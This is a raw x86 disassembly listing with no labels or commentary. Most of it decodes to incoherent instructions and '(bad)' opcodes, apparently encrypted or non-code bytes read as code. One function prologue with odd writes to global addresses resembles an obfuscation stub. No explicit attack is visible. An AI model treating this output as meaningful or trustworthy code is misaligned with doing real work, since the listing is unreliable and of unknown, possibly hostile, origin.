  403fe5:	inc    edi
  403fe7:	inc    ebp
  403fe8:	enter  0x918b,0xfc
  403fec:	inc    ebp
  403fed:	(bad)  
  403fee:	mov    eax,DWORD PTR [eax+edi*8-0x38cd3961]
  403ff5:	mov    DWORD PTR [esi-0x4],ebx
  403ff8:	rol    DWORD PTR [ebp-0x37],0x8b
  403ffc:	add    al,0xf4
  403ffe:	push   ebp
  403fff:	into   
  404000:	in     al,dx
  404001:	mov    BYTE PTR [ebp-0x3f],0x8b
  404005:	dec    ebp
  404006:	or     BYTE PTR [ebx],bh
  404008:	xor    BYTE PTR [esi+0x1],0x8b
  40400c:	add    ah,ah
  40400e:	add    dh,al
  404010:	in     al,dx
  404011:	(bad)  
  404012:	push   ebx
  404013:	inc    ebp
  404014:	mov    eax,edi
  404016:	adc    al,ch
  404018:	push   ss
  404019:	xchg   BYTE PTR [edi+0x7db08f8],bh
  40401f:	popa   
  404020:	iret   
  404021:	dec    ebp
  404022:	lahf   
  404023:	mov    esi,DWORD PTR [edx]
  404025:	clc    
  404026:	add    ecx,esi
  404028:	cmp    ecx,edi
  40402a:	jne    0x404014
  40402c:	add    DWORD PTR [ebp-0x6f],0x4f08648b
  404033:	or     BYTE PTR [ebx+0x48ae94d],bl
  404039:	or     eax,DWORD PTR [eax]
  40403b:	push   ebp
  40403c:	dec    ebp
  40403d:	jnp    0xd00a4d0c
  404043:	dec    ebp
  404044:	xlat   BYTE PTR ds:[ebx]
  404045:	mov    ecx,ebx
  404047:	call   0x340a961f
  40404c:	lsl    ecx,WORD PTR ds:0x7f8b2d23
  404053:	(bad)  
  404054:	cld    
  404055:	sti    
  404056:	lahf   
  404057:	(bad)  
  404058:	mov    ebp,0x8b330055
  40405d:	mov    DWORD PTR [eax],ecx
  40405f:	clc    
  404060:	iret   
  404061:	dec    ebp
  404062:	retf   
  404063:	xor    eax,ecx
  404065:	lea    eax,[eax+ecx*1+0x7204]
  40406c:	dec    ebp
  40406d:	inc    ebp
  40406e:	mov    DWORD PTR [ebx-0x39b20b24],ecx
  404074:	mov    esp,DWORD PTR [ecx+0x14]
  404077:	int    0x6
  404079:	sub    eax,DWORD PTR [ebp+0x3]
  40407c:	(bad)  
  40407d:	lock or BYTE PTR [ebp-0x7b],cl
  404081:	mov    edi,eax
  404083:	in     al,dx
  404084:	cmp    ecx,DWORD PTR [ebp-0x64]
  404087:	xor    ecx,DWORD PTR [ecx+0x453bf003]
  40408d:	jne    0x404018
  40408f:	mov    ebx,DWORD PTR [eax]
  404091:	in     al,0x45
  404093:	dec    ebp
  404094:	mov    esi,DWORD PTR [ebx]
  404096:	nop
  404097:	add    eax,DWORD PTR [eax]
  404099:	pop    edi
  40409a:	mov    esi,DWORD PTR [ebx]
  40409c:	mov    DWORD PTR [ebx-0x2c],ebx
  40409f:	ret    0x4d
  4040a2:	mov    ecx,DWORD PTR [ebx+0x18008b90]
  4040a8:	mov    ecx,DWORD PTR [ebp+0x3]
  4040ab:	mov    edi,DWORD PTR [eax+edx*4]
  4040ae:	dec    ebp
  4040af:	add    BYTE PTR [ebx-0x387cf775],cl
  4040b5:	jo     0x40407a
  4040b7:	push   esi
  4040b8:	inc    ebp
  4040b9:	jne    0x404046
  4040bb:	mov    ecx,DWORD PTR [eax]
  4040bd:	push   edi
  4040be:	(bad)  
  4040bf:	pop    ecx
  4040c0:	ret    
  4040c1:	push   ecx
  4040c2:	inc    ebp
  4040c3:	xor    ecx,DWORD PTR [ebx+0x40720cbb]
  4040c9:	add    BYTE PTR [ebx+0x45d10ccb],al
  4040cf:	jnp    0x406d4d02
  4040d5:	jg     0x404062
  4040d7:	jmp    0x54:0xde85700c
  4040de:	inc    ebp
  4040df:	mov    esi,DWORD PTR [eax+ecx*1-0x75]
  4040e3:	push   ebp
  4040e4:	cmp    BYTE PTR [ebx],dh
  4040e6:	dec    ebp
  4040e7:	xor    ecx,DWORD PTR [ebx-0x8fcabfd]
  4040ed:	cmp    esp,DWORD PTR [ebx]
  4040ef:	jne    0x40407c
  4040f1:	or     DWORD PTR [ecx+edx*4],0xee036440
  4040f8:	jmp    0x40410f
  4040fa:	mov    ebp,ecx
  4040fc:	push   esp
  4040fd:	add    al,0x45
  4040ff:	add    BYTE PTR [ebx-0x38ccf7b3],cl
  404105:	add    eax,ebx
  404107:	cmp    eax,DWORD PTR [ebp+0xf]
  40410a:	mov    esp,DWORD PTR [eax+ecx*1-0x3c743900]
  404111:	sbb    BYTE PTR [ebp+0x45],al
  404114:	mov    ecx,DWORD PTR [ecx+0x4d4d1808]
  40411a:	xor    ecx,DWORD PTR [ebx-0x277676fd]
  404120:	mov    DWORD PTR [ebp+0x14],eax
  404123:	cmp    BYTE PTR [ebp-0x64],al
  404126:	cmp    bh,BYTE PTR [edx-0x7387a64]
  40412c:	adc    al,0x55
  40412e:	test   DWORD PTR [ebx+0x454518f8],ecx
  404134:	cmp    al,0x8b
  404136:	pushf  
  404137:	sbb    BYTE PTR [ebx+0x4d01f080],cl
  40413d:	add    BYTE PTR [ebx],dh
  40413f:	add    BYTE PTR [ebx],al
  404141:	dec    ebp
  404142:	jnp    0x898d5a09
  404148:	mov    eax,DWORD PTR [ecx]
  40414a:	rol    BYTE PTR [eax],1
  40414c:	iret   
  40414d:	or     DWORD PTR [eax+ecx*2+0xc32899f],ecx
  404154:	cmp    eax,DWORD PTR [ebp+0xf]
  404157:	xor    ebp,DWORD PTR [ebx+eax*1-0xb747700]
  40415e:	or     BYTE PTR [ebp-0x39],al
  404161:	xor    eax,ebx
  404163:	add    eax,DWORD PTR [ebp-0x77]
  404166:	mov    edx,DWORD PTR [eax+ebx*1]
  404169:	inc    ebp
  40416a:	inc    ebp
  40416b:	mov    ecx,DWORD PTR [ecx+0x75e8f450]
  404171:	mov    DWORD PTR [ebx+0x4d45dcd0],ecx
  404177:	mov    ebp,eax
  404179:	cmp    cl,dh
  40417b:	dec    ebp
  40417c:	dec    DWORD PTR [eax+0x45]
  40417f:	inc    ecx
  404180:	(bad)  
  404181:	mov    esp,eax
  404183:	or     al,0x85
  404185:	sbb    al,bh
  404187:	inc    eax
  404188:	inc    ebp
  404189:	mov    esi,DWORD PTR [ebx]
  40418b:	or     al,0x3
  40418d:	dec    ecx
  40418e:	push   eax
  40418f:	dec    eax
  404190:	inc    ebp
  404191:	rcl    BYTE PTR [eax-0x38],1
  404194:	push   eax
  404195:	inc    ebp
  404196:	dec    DWORD PTR [ebx-0x3e07c775]
  40419c:	rol    BYTE PTR [ebx],0x4e
  40419f:	inc    eax
  4041a0:	inc    ebp
  4041a1:	mov    DWORD PTR [ebx],esi
  4041a3:	sbb    BYTE PTR [ebx],al
  4041a5:	inc    ebp
  4041a6:	push   eax
  4041a7:	xor    esi,DWORD PTR [ebp+0x3]
  4041aa:	lea    ecx,[ecx+0x45e814b8]
  4041b0:	cmc    
  4041b1:	xor    edi,edi
  4041b3:	add    eax,DWORD PTR [ebp-0x77]
  4041b6:	mov    DWORD PTR [eax+eiz*8],edx
  4041b9:	inc    ebp
  4041ba:	inc    ebp
  4041bb:	mov    ecx,DWORD PTR [ebx-0x3e38232c]
  4041c1:	ret    
  4041c2:	inc    ebp
  4041c3:	add    DWORD PTR [ebx+0x4dc7f855],ecx
  4041c9:	adc    al,0x8b
  4041cb:	test   DWORD PTR [eax],edx
  4041cd:	clc    
  4041ce:	inc    ecx
  4041cf:	inc    ebp
  4041d0:	mov    edi,DWORD PTR ds:0xc7c89ce0
  4041d6:	push   ss
  4041d7:	adc    al,0x45
  4041d9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4041df:	mov    eax,DWORD PTR [ebx]
  4041e1:	sbb    BYTE PTR [eax],cl
  4041e3:	(bad)  
  4041e4:	dec    ebp
  4041e5:	ret    
  4041e6:	sub    ebp,DWORD PTR [edi+0x8028be9]
  4041ec:	add    BYTE PTR [ebp+0xc],dl
  4041ef:	xor    esi,DWORD PTR [ebp-0x73]
  4041f2:	lea    edx,[ecx]
  4041f4:	lods   al,BYTE PTR ds:[esi]
  4041f5:	jb     0x4041df
  4041f7:	add    ch,dh
  4041f9:	sar    edi,0x83
  4041fc:	cmp    BYTE PTR [ebx],al
  4041fe:	pushf  
  4041ff:	add    BYTE PTR [ecx+0x4533cc45],cl
  404205:	add    edi,DWORD PTR [ebx]
  404207:	mov    DWORD PTR [esp+edx*1+0x3c445c7],ebx
  40420e:	test   esp,ebx
  404210:	clc    
  404211:	inc    ebp
  404212:	inc    ebp
  404213:	(bad)  
  404214:	cmp    eax,0x8d759cf4
  404219:	mov    ecx,esp
  40421b:	or     al,0x4d
  40421d:	bound  ecx,QWORD PTR [ebp+0x4d89c8ff]
  404223:	clc    
  404224:	lea    eax,[ebp-0x3c]
  404227:	xor    BYTE PTR [ebp-0x64],cl
  40422a:	lea    ecx,[ebx-0x38b21f40]
  404230:	mov    eax,ebx
  404232:	or     BYTE PTR [ebp-0x17344731],cl
  404238:	dec    ebp
  404239:	imul   ecx
  40423b:	inc    DWORD PTR [ecx]
  40423d:	inc    ebp
  40423e:	add    BYTE PTR [ebp-0x74638bc6],al
  404244:	pavgb  mm7,mm6
  404247:	mov    DWORD PTR [eax],0xf0ff8bc3
  40424d:	clc    
  40424e:	iret   
  40424f:	inc    ebp
  404250:	lock push eax
  404252:	retf   
  404253:	fmul   QWORD PTR [ebp-0x1]
  404256:	mov    ecx,DWORD PTR [ebx+0x45f7f4e0]
  40425c:	test   BYTE PTR [ebx+0x4d32e09f],cl
  404262:	mov    DWORD PTR [ebx],ebp
  404264:	loopne 0x4041ef
  404266:	inc    ebp
  404267:	loopne 0x4041f4
  404269:	inc    ebp
  40426a:	loopne 0x4041f7
  40426c:	xbegin 0x4088335
  404272:	adc    ecx,DWORD PTR [eax*2+0x33b334d]
  404279:	jb     0x4042cb
  40427b:	mov    ecx,DWORD PTR [eax+edi*8]
  40427e:	inc    ebp
  40427f:	inc    eax
  404280:	push   eax
  404281:	mov    ebx,DWORD PTR [edi-0x8]
  404284:	inc    DWORD PTR [ecx-0x75]
  404287:	mov    ebp,esp
  404289:	loopne 0x40428b
  40428b:	rol    edi,0xee
  40428e:	test   BYTE PTR [eax],al
  404290:	dec    ebx
  404291:	push   0x32
  404293:	dec    DWORD PTR [ebx-0x30baf70c]
  404299:	push   eax
  40429a:	mov    dh,0x94
  40429c:	add    edi,edi
  40429e:	cmp    edi,DWORD PTR [eax-0x7877af1]
  4042a4:	add    BYTE PTR [ebp-0x75],al
  4042a7:	(bad)  
  4042a8:	call   0xc7c54375
  4042ad:	clc    
  4042ae:	test   BYTE PTR [ebp+0x4b],al
  4042b1:	cmp    dh,BYTE PTR [edx]
  4042b3:	pushf  
  4042b4:	mov    eax,edi
  4042b6:	or     al,al
  4042b8:	iret   
  4042b9:	test   DWORD PTR [esi+0x3b4d03f8],esi
  4042bf:	mov    DWORD PTR [edi],ecx
  4042c1:	in     al,dx
  4042c2:	pop    eax
  4042c3:	dec    ebp
  4042c4:	add    BYTE PTR [ecx+0x4df8e88b],cl
  4042ca:	add    BYTE PTR [ecx+0x4d84f8c7],cl
  4042d0:	dec    ebx
  4042d1:	mov    DWORD PTR [edx],esi
  4042d3:	in     al,0x8b
  4042d5:	dec    ebp
  4042d6:	or     BYTE PTR [ebx],dh
  4042d8:	iret   
  4042d9:	add    esi,DWORD PTR [esi+0x3be00389]
  4042df:	test   DWORD PTR [edi],0x3d3800
  4042e5:	test   DWORD PTR [ebx+0x84e4f8],ecx
  4042eb:	add    edi,eax
  4042ed:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  4042f4:	mov    eax,DWORD PTR [ebx]
  4042f6:	or     BYTE PTR [ecx+0x45b614cf],cl
  4042fc:	add    esi,DWORD PTR [ebx]
  4042fe:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  404304:	add    BYTE PTR [eax],al
  404306:	mov    eax,DWORD PTR [ebp-0x18]
  404309:	mov    eax,DWORD PTR [eax]
  40430b:	lock (bad) 
  40430d:	dec    ebp
  40430e:	test   BYTE PTR [ebx],dh
  404310:	dec    ebx
  404311:	add    esi,DWORD PTR [edx]
  404313:	cmp    ecx,DWORD PTR [ebx+0x98bec75]
  404319:	or     bh,cl
  40431b:	(bad)  
  40431c:	mov    ebx,es
  40431e:	dec    ebx
  40431f:	push   0x32
  404321:	lea    esi,[edx]
  404323:	lods   al,BYTE PTR ds:[esi]
  404324:	mov    ebp,eax
  404326:	clc    
  404327:	cli    
  404328:	or     edi,edi
  40432a:	iret   
  40432b:	inc    ebp
  40432c:	mov    WORD PTR [ebx-0x75cdccb5],cs
  404332:	or     al,BYTE PTR ds:0xec728b
  404338:	or     DWORD PTR [ebp-0x31],ecx
  40433b:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  404342:	cmp    al,cl
  404344:	je     0x40451e
  40434a:	mov    eax,DWORD PTR [ebp-0x8]
  40434d:	mov    eax,DWORD PTR [eax]
  40434f:	xor    eax,edi
  404351:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  404358:	mov    ecx,DWORD PTR [ebp-0x18]
  40435b:	xor    ecx,DWORD PTR [ecx]
  40435d:	bswap  edi
  40435f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  404367:	add    DWORD PTR [ebx+0x945e400],ecx
  40436d:	mov    ecx,edi
  40436f:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  404376:	or     al,BYTE PTR [eax]
  404378:	mov    ecx,DWORD PTR [ebp-0x18]
  40437b:	xor    ecx,DWORD PTR [ecx]
  40437d:	bswap  edi
  40437f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  404387:	add    DWORD PTR [edi],ecx
  404389:	add    BYTE PTR [eax-0x7474ffbb],dl
  40438f:	xor    esp,esp
  404391:	mov    al,BYTE PTR [eax]
  404393:	add    eax,0x8472c7
  404398:	dec    ebx
  404399:	dec    ebp
  40439a:	xor    dh,BYTE PTR [ebx]
  40439c:	mov    ecx,DWORD PTR [edi]
  40439e:	clc    
  40439f:	ror    BYTE PTR [ecx],0xcb
  4043a2:	iret   
  4043a3:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  4043ab:	inc    ebp
  4043ac:	mov    ecx,DWORD PTR [ebx-0x75f6cc14]
  4043b2:	iret   
  4043b3:	add    eax,0x4b728c
  4043b8:	xor    cl,BYTE PTR [ebp+0xa]
  4043bb:	mov    ecx,DWORD PTR [ebx+0x98af833]
  4043c1:	or     eax,0x8c72cf
  4043c6:	dec    edi
  4043c7:	shl    DWORD PTR [edx],0x4d
  4043ca:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  4043d0:	in     al,0xd
  4043d2:	add    BYTE PTR [edx-0x39],dh
  4043d5:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4043dc:	mov    esi,DWORD PTR [ebx]
  4043de:	in     al,dx
  4043df:	mov    cl,BYTE PTR [ecx]
  4043e1:	or     eax,0x8c72cf
  4043e6:	dec    ebx
  4043e7:	enter  0x8532,0x32
  4043eb:	add    BYTE PTR [ebx+0x945e800],cl
  4043f1:	mov    ecx,edi
  4043f3:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  4043fa:	or     al,BYTE PTR [eax]
  4043fc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4043ff:	mov    ecx,DWORD PTR [ecx]
  404401:	xor    ecx,edi
  404403:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  40440a:	cmp    al,cl
  40440c:	jne    0x40445b
  40440e:	lea    ecx,[ebx-0x7517cc54]
  404414:	cli    
  404415:	or     eax,0x4d72ff
  40441a:	cmp    eax,ecx
  40441c:	je     0x40446b
  40441e:	mov    ecx,DWORD PTR [ebx-0x7538ccf8]
  404424:	ret    
  404425:	or     eax,0x8b7245
  40442a:	lock enter 0x85c7,0x84
  40442f:	add    BYTE PTR [edi+0x33453200],bl
  404435:	mov    ecx,DWORD PTR [ebx+0x558a0833]
  40443b:	add    eax,0x37233
  404440:	cmp    ecx,DWORD PTR [ebp+0xf]
  404443:	mov    esi,edi
  404445:	xor    edi,edi
  404447:	mov    cl,BYTE PTR [ebx+0x4d72080d]
  40444d:	add    BYTE PTR [ebx],dh
  40444f:	rol    DWORD PTR [ebx],0x4d
  404452:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  404458:	lock or eax,0x33724d
  40445e:	(bad)  
  40445f:	ror    DWORD PTR [eax],0x4d
  404462:	jb     0x4043ef
  404464:	add    BYTE PTR [ebx],dh
  404466:	ja     0x4043f2
  404468:	sbb    BYTE PTR ds:0x8d7275,cl
  40446e:	xchg   esp,eax
  40446f:	enter  0x50e8,0xf3
  404473:	inc    ebp
  404474:	dec    DWORD PTR [ebx-0x7574ccbb]
  40447a:	loopne 0x404481
  40447c:	(bad)  
  40447d:	jb     0x404442
  40447f:	add    cl,al
  404481:	dec    ebp
  404482:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  404488:	add    ecx,DWORD PTR ds:0x187250
  40448e:	inc    ebp
  40448f:	rcl    DWORD PTR [eax+0x4d],0x4f
  404493:	mov    edi,edi
  404495:	xor    ecx,DWORD PTR [ebx-0x3ff20b76]
  40449b:	jb     0x404426
  40449d:	add    BYTE PTR [ecx+eax*8],dl
  4044a0:	jne    0x4044ef
  4044a2:	dec    DWORD PTR [ebx-0x75baccec]
  4044a8:	add    ecx,DWORD PTR ds:0xe872d8
  4044ae:	repnz enter 0x10ff,0x45
  4044b3:	inc    ebp
  4044b4:	mov    edx,DWORD PTR [eax-0x20]
  4044b7:	mov    ds:0x8bc3ffc7,eax
  4044bc:	shl    DWORD PTR [ecx+edx*1+0x750a00c1],0x45
  4044c4:	mov    esi,DWORD PTR [ebx]
  4044c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044c7:	add    eax,DWORD PTR [ebp-0x77]
  4044ca:	push   eax
  4044cb:	adc    al,0x15
  4044cd:	inc    ebp
  4044ce:	push   DWORD PTR [ebx]
  4044d0:	mov    ecx,DWORD PTR [ebp+0x724d30d4]
  4044d6:	add    DWORD PTR [eax],eax
  4044d8:	mov    eax,edi
  4044da:	test   al,0x4d
  4044dc:	inc    ebp
  4044dd:	mov    ecx,DWORD PTR [ecx+0x45cf1814]
  4044e3:	retf   
  4044e4:	mov    edx,ecx
  4044e6:	sbb    BYTE PTR [edi+eax*8-0x50003c03],al
  4044ed:	inc    ebp
  4044ee:	mov    ecx,DWORD PTR [ebx-0x38aaebf8]
  4044f4:	xor    eax,ebx
  4044f6:	(bad)  
  4044f7:	enter  0x1111,0x72
  4044fb:	inc    ebp
  4044fc:	add    BYTE PTR [ebx-0x387de73f],cl
  404502:	cld    
  404503:	test   bh,bh
  404505:	lahf   
  404506:	jne    0x40453a
  404508:	mov    ebp,ebx
  40450a:	fsubr  DWORD PTR [edx+0x6]
  40450d:	dec    DWORD PTR [edx]
  40450f:	hlt    
  404510:	xor    eax,0x7f502d45
  404515:	sbb    ch,ah
  404517:	call   DWORD PTR [edx-0x75]
  40451a:	pop    esi
  40451b:	or     cl,cl
  40451d:	dec    ebp
  40451e:	adc    al,0x33
  404520:	push   ebp
  404521:	add    ebp,esp
  404523:	cmp    esp,esp
  404525:	je     0x4044aa
  404527:	mov    esp,DWORD PTR [eax]
  404529:	or     BYTE PTR [eax],bh
  40452b:	(bad)  
  40452c:	pushf  
  40452d:	ret    
  40452e:	mov    DWORD PTR [edx+0x24],ebp
  404531:	lea    ecx,[ebp+0x44e80394]
  404537:	clc    
  404538:	or     al,0xff
  40453a:	push   esp
  40453b:	inc    ebp
  40453c:	or     BYTE PTR [ebx+0x450818be],al
  404542:	pop    es
  404543:	call   esi
  404545:	test   al,0xbf
  404547:	jne    0x4045bb
  404549:	mov    eax,DWORD PTR [eax]
  40454b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40454c:	xlat   BYTE PTR ds:[ebx]
  40454d:	inc    ebp
  40454e:	push   esp
  40454f:	push   eax
  404550:	or     al,0xde
  404552:	push   ebp
  404553:	dec    DWORD PTR [ecx-0x74f7db75]
  404559:	dec    ebp
  40455a:	adc    BYTE PTR [ebx],dh
  40455c:	rol    DWORD PTR [ebx],1
  40455e:	sbb    BYTE PTR [ebx],bh
  404560:	dec    esp
  404561:	je     0x404577
  404563:	push   0x54
  404565:	call   DWORD PTR [eax]
  404567:	test   al,0xce
  404569:	inc    ebp
  40456a:	iret   
  40456b:	add    ebp,DWORD PTR [edi+0x24e889d8]
  404571:	clc    
  404572:	jmp    0x854776
  404577:	mov    edx,eax
  404579:	test   al,0x1f
  40457b:	or     BYTE PTR [ebp+eax*2+0x10],al
  40457f:	add    ecx,DWORD PTR [eax+ebx*1+0x14]
  404583:	inc    ebp
  404584:	(bad)  
  404585:	mov    eax,DWORD PTR [eax+esi*8+0x33324d9f]
  40458c:	mov    DWORD PTR [ebx],eax
  40458e:	and    al,0xf
  404590:	push   0xf84d85c1
  404595:	mov    edi,ebp
  404597:	rol    BYTE PTR [eax],1
  404599:	iret   
  40459a:	or     DWORD PTR [edx+edi*1+0x75329c9f],0x850f683b
  4045a5:	push   edi
  4045a6:	clc    
  4045a7:	(bad)  
  4045a8:	jmp    0x404535
  4045aa:	add    BYTE PTR [eax],dl
  4045ac:	mov    eax,0xf8898545
  4045b1:	jmp    0x404583
  4045b3:	add    DWORD PTR [ebp+0x640091],0x206544be
  4045bd:	pop    edi
  4045be:	inc    esp
  4045bf:	pop    ebx
  4045c0:	sbb    dl,al
  4045c2:	inc    ebp
  4045c3:	add    BYTE PTR [ecx-0x747cdb75],cl
  4045c9:	clc    
  4045ca:	and    al,0xec
  4045cc:	mov    DWORD PTR [ecx-0x7747adc],edi
  4045d2:	and    al,0x4c
  4045d4:	mov    DWORD PTR [eax],ecx
  4045d6:	and    al,0x41
  4045d8:	mov    ecx,DWORD PTR [ecx-0x7474dbdc]
  4045de:	and    al,0x24
  4045e0:	xor    edx,DWORD PTR [esi+0x3]
  4045e3:	pop    ecx
  4045e4:	mov    DWORD PTR [ecx-0x75],edx
  4045e7:	xor    esp,DWORD PTR [edi+edx*2]
  4045ea:	mov    ebx,DWORD PTR [edi+0x3003294]
  4045f0:	mov    ecx,DWORD PTR [ecx-0x74dbdb75]
  4045f6:	mov    ecx,DWORD PTR [esp+edx*4]
  4045f9:	push   esp
  4045fa:	add    BYTE PTR [eax],ah
  4045fc:	mov    edx,DWORD PTR [ebp+0x3]
  4045ff:	cmp    edi,DWORD PTR [esi*2+0x24188b4c]
  404606:	mov    DWORD PTR [ebx+0x33002401],ecx
  40460c:	dec    ecx
  40460d:	add    ebp,DWORD PTR [edx+0xf]
  404610:	push   0x4c30ca
  404615:	adc    BYTE PTR [eax+0x1f],dh
  404618:	push   0x0
  40461a:	(bad)  
  40461b:	cmp    ecx,DWORD PTR [ecx-0x7474db8b]
  404621:	and    al,0x24
  404623:	mov    esi,DWORD PTR [ebx]
  404625:	and    al,0x3
  404627:	xor    ecx,DWORD PTR [ecx-0x74f7db73]
  40462d:	jb     0x404653
  40462f:	add    bh,bh
  404631:	inc    esp
  404632:	and    al,0x14
  404634:	lea    edi,[edx]
  404636:	and    al,0x9c
  404638:	push   eax
  404639:	jmp    0x544682
  40463e:	(bad)  
  40463f:	cli    
  404640:	and    al,0x85
  404642:	(bad)  
  404643:	clc    
  404644:	and    al,0xa
  404646:	call   0xffdd3f88
  40464b:	jmp    0x544694
  404650:	dec    esp
  404651:	ds or  al,0x9c
  404654:	(bad)  
  404655:	cmp    eax,edi
  404657:	bswap  eax
  404659:	mov    bh,0x4b
  40465b:	add    BYTE PTR [ebx+ecx*4+0x20],al
  40465f:	and    al,0x4c
  404661:	mov    DWORD PTR [esp],ebx
  404664:	(bad)  
  404665:	mov    eax,edi
  404667:	or     BYTE PTR [edi-0x76e3dbbc],ch
  40466d:	inc    esp
  40466e:	jmp    0x404684
  404670:	add    DWORD PTR [ebp+edi*1+0x20],0x1075449c
  404678:	push   0xf8148544
  40467d:	inc    esp
  40467e:	sbb    BYTE PTR [edx+edi*8],dl
  404681:	dec    esp
  404682:	test   DWORD PTR [eax+edi*8],ebx
  404685:	mov    BYTE PTR [edi],0xc7
  404688:	aas    
  404689:	add    DWORD PTR [esp+eax*2-0x7f7ee715],ebx
  404690:	aas    
  404691:	add    DWORD PTR [eax+eax*1+0x44500875],ebx
  404698:	jne    0x4046b2
  40469a:	inc    DWORD PTR [eax+0xfa01f8]
  4046a0:	clc    
  4046a1:	add    bh,bh
  4046a3:	inc    ecx
  4046a4:	jne    0x404631
  4046a6:	call   0xffcc44cf
  4046ab:	fadd   DWORD PTR [eax+eax*1+0xc]
  4046af:	mov    eax,DWORD PTR [esp+edx*1+0xc]
  4046b3:	add    al,0x5e
  4046b5:	add    ch,ah
  4046b7:	add    dl,al
  4046b9:	inc    DWORD PTR [eax]
  4046bb:	push   eax
  4046bc:	and    al,0x0
  4046be:	rol    DWORD PTR ss:[ebp-0x63f3f8bc],1
  4046c5:	inc    esp
  4046c6:	adc    DWORD PTR [esp+ebx*4],0x9c768c6
  4046cd:	inc    esp
  4046ce:	adc    BYTE PTR [eax+ecx*1],ah
  4046d1:	inc    esp
  4046d2:	call   FWORD PTR [esp]
  4046d5:	je     0x4046fb
  4046d7:	sbb    BYTE PTR [ebx-0x74d7f3bc],cl
  4046dd:	lea    ecx,[ebx+0x3b503324]
  4046e3:	je     0x404670
  4046e5:	sub    al,0x8b
  4046e7:	je     0x40471c
  4046e9:	and    al,0xf
  4046eb:	mov    bl,0x1
  4046ed:	(bad)  
  4046ee:	clc    
  4046ef:	and    al,0xeb
  4046f1:	and    al,0x75
  4046f3:	add    eax,DWORD PTR [ebp-0x74db818c]
  4046f9:	and    al,0x5d
  4046fb:	add    eax,DWORD PTR [edx+edi*8+0x3c]
  4046ff:	cmp    al,0x85
  404701:	or     al,0x89
  404703:	pop    edi
  404704:	push   ebp
  404705:	mov    ebp,esp
  404707:	sub    esp,0x78
  40470a:	xor    eax,DWORD PTR ds:0x412370
  404710:	mov    eax,ds:0x40d5d0
  404715:	mov    DWORD PTR [ebp-0x10],eax
  404718:	mov    eax,ds:0x40d6dc
  40471d:	or     DWORD PTR ds:0x417e59,0x49bb
  404727:	mov    DWORD PTR [ebp-0x30],eax
  40472a:	mov    DWORD PTR [ebp-0xc],0xf89c8538
  404731:	mov    eax,ds:0x412368
  404736:	and    DWORD PTR ds:0x41abde,eax
  40473c:	mov    DWORD PTR [ebp-0x14],0xf89c853b
  404743:	mov    eax,DWORD PTR [ebp-0xc]
  404746:	xor    DWORD PTR ds:0x4235cf,0x412378
  404750:	push   ebx
  404751:	push   esi
  404752:	and    DWORD PTR ds:0x417e55,0x7bf9
  40475c:	push   edi
  40475d:	mov    esi,0x7510859
  404762:	xor    eax,esi
  404764:	add    DWORD PTR ds:0x4235d7,0x4e22
  40476e:	mov    edi,0x32729f
  404773:	or     DWORD PTR ds:0x4235d7,0x5629
  40477d:	add    eax,edi
  40477f:	mov    DWORD PTR [ebp-0x20],eax
  404782:	movzx  eax,WORD PTR ds:0x412370
  404789:	and    DWORD PTR ds:0x415111,eax
  40478f:	mov    DWORD PTR [ebp-0x28],0xf89cb538
  404796:	dec    eax
  404797:	mov    DWORD PTR [ebp-0x34],0xf89f0538
  40479e:	mov    DWORD PTR [ebp-0x2c],0xf89c85f8
  4047a5:	add    DWORD PTR ds:0x41abd2,edx
  4047ab:	jmp    0x404924
  4047b0:	xlat   BYTE PTR ds:[ebx]
  4047b1:	mov    dl,0x2
  4047b3:	and    edi,DWORD PTR [ebx-0x5fa5289d]
  4047b9:	mov    al,ds:0xa4b387ea
  4047be:	out    dx,eax
  4047bf:	mov    WORD PTR [esi+0x7e],?
  4047c2:	jle    0x404842
  4047c4:	fidivr DWORD PTR [edi+0x7e]
  4047c7:	jle    0x404797
  4047c9:	(bad)  
  4047ca:	cmp    eax,0xcfdb31c5
  4047cf:	fld    st(2)
  4047d1:	ja     0x404847
  4047d3:	or     eax,DWORD PTR [eax]
  4047d5:	daa    
  4047d6:	or     BYTE PTR [edi],cl
  4047d8:	cmp    ecx,DWORD PTR [edi]
  4047da:	enter  0x3710,0x18
  4047de:	pop    ds
  4047df:	mov    cl,0x50
  4047e1:	or     BYTE PTR [edi-0x4210f123],ah
  4047e7:	rol    esi,cl
  4047e9:	or     ecx,DWORD PTR [esi-0x551b41ea]
  4047ef:	dec    ecx
  4047f0:	add    eax,0x1fb6dead
  4047f5:	push   esi
  4047f6:	in     al,dx
  4047f7:	outs   dx,DWORD PTR ds:[esi]
  4047f8:	add    ebx,DWORD PTR [ecx]
  4047fa:	pushf  
  4047fb:	jo     0x4047c3
  4047fd:	dec    eax
  4047fe:	mov    ds:0x34d92d5b,al
  404803:	cmp    al,0xad
  404805:	xor    BYTE PTR [ebx+0x35],0xa3
  404809:	jbe    0x40483f
  40480b:	fisttp DWORD PTR [ecx+0x3198c6f1]
  404811:	jecxz  0x40484b
  404813:	and    ecx,0x4f
  404816:	(bad)  
  404817:	xchg   esi,eax
  404818:	dec    ecx
  404819:	inc    DWORD PTR [edi-0x2d5e8870]
  40481f:	mov    ebp,0x4526ed4d
  404824:	sub    edi,DWORD PTR [edx-0x4361911e]
  40482a:	jae    0x404845
  40482c:	retf   
  40482d:	call   0xd4ca:0x5ee3c429
  404834:	mov    al,0xf8
  404836:	loop   0x4047d2
  404838:	cmp    edi,ecx
  40483a:	fs push ebp
  40483c:	(bad)  
  40483d:	sub    ch,cl
  40483f:	or     dl,cl
  404841:	sbb    DWORD PTR [ecx-0x6a],ebx
  404844:	and    eax,0x70696f0b
  404849:	add    BYTE PTR [ecx],bh
